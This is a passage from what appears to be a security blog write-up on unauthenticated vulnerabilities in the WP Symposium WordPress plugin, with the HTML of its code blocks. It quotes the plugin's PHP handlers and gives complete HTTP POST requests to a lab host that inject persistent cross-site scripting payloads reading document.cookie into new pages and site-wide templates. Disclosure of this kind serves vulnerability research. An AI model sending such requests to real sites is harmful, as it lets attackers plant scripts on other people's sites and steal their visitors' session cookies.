class="crayon-s">"posts SET guid = '%s' WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-77"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0130 seconds] -->
<p>This long bit of code will effectively take in any arbitrary text input and add a new page with said input. As there&#8217;s no validation of the current user being authenticated, leave alone being an user with appropiate privileges to do this, we can exploit this to pull off a persistent XSS by adding a new page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f23767629067974" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

action=add_new_page&amp;name=Hello this is dog&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f23767629067974-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23767629067974-2">2</div><div class="crayon-num" data-line="crayon-53c9878f23767629067974-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23767629067974-4">4</div><div class="crayon-num" data-line="crayon-53c9878f23767629067974-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23767629067974-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f23767629067974-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23767629067974-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f23767629067974-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23767629067974-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">93</span></div><div class="crayon-line" id="crayon-53c9878f23767629067974-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23767629067974-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_new_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-e">Hello </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-i">dog</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0030 seconds] -->
<p><strong>Analysis of import_template_file vulnerability</strong><br />
The last vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is a bit more fun, because it does not directly touch the DB in this code. Rather, it uses the symposium_update_import_snippet function to extraplote a value to insert into the database through <a href="http://codex.wordpress.org/Function_Reference/update_option">update_option</a>. By being a bit crafty with our request, we can once again cause a persistent XSS due to a lack of validation of the calling user, since we can ship our payload into parts of the template, many of which are used by *most* pages.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2376e495176209" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "import_template_file") {

	$import_file = $_POST['import_file'];
	
	symposium_update_import_snippet("template_profile_header", $import_file);
	symposium_update_import_snippet("template_profile_body", $import_file);
	symposium_update_import_snippet("template_page_footer", $import_file);
	symposium_update_import_snippet("template_email", $import_file);
	symposium_update_import_snippet("template_forum_header", $import_file);
	symposium_update_import_snippet("template_mail", $import_file);
	symposium_update_import_snippet("template_mail_tray", $import_file);
	symposium_update_import_snippet("template_mail_message", $import_file);
	symposium_update_import_snippet("template_group", $import_file);
	symposium_update_import_snippet("template_forum_category", $import_file);
	symposium_update_import_snippet("template_forum_topic", $import_file);
	symposium_update_import_snippet("template_group_forum_category", $import_file);
	symposium_update_import_snippet("template_group_forum_topic", $import_file);

	echo 'OK';
	exit;
}
function symposium_update_import_snippet($tag, $import_file) {
	global $wpdb;
	$start = strpos($import_file, "&lt;!-- ".$tag." --&gt;") + strlen("&lt;!-- ".$tag." --&gt;")+1;
	$end = strpos($import_file, "&lt;!-- end_".$tag." --&gt;");
	$snippet = substr($import_file, $start, $end-$start-1);
	update_option('symposium_'.$tag, $snippet);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-8">8</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-10">10</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-12">12</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-14">14</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-16">16</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-18">18</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-20">20</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-22">22</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-24">24</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-26">26</div><div class="crayon-num" data-line="crayon-53c9878f2376e495176209-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2376e495176209-28">28</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2376e495176209-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"import_template_file"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2376e495176209-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">import_file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'import_file'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_body"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_page_footer"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_email"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_tray"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_message"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-18">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2376e495176209-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-21"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-22"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- end_"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">snippet</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-o">-</span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2376e495176209-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">update_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">snippet</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2376e495176209-28"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0099 seconds] -->
<p>In our request, we need to add a bit of whatespace around our payload to allow for a margin of error, because the way it does the substringing isn&#8217;t that nice. This request will show how to do a simple alert, which will show on most pages on the site.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f23776071283128" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

action=import_template_file&amp;import_file=&lt;!-- template_forum_header --&gt;           &lt;script&gt;alert(document.cookie); &lt;/script&gt;           &lt;!-- end_template_forum_header --&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f23776071283128-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23776071283128-2">2</div><div class="crayon-num" data-line="crayon-53c9878f23776071283128-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23776071283128-4">4</div><div class="crayon-num" data-line="crayon-53c9878f23776071283128-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f23776071283128-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f23776071283128-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23776071283128-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f23776071283128-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23776071283128-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">167</span></div><div class="crayon-line" id="crayon-53c9878f23776071283128-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f23776071283128-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">import_template_file</span><span class="crayon-o">&amp;</span><span class="crayon-v">import_file</span><span class="crayon-o">=</span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-e">template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">&lt;/script&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-i">end_template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span 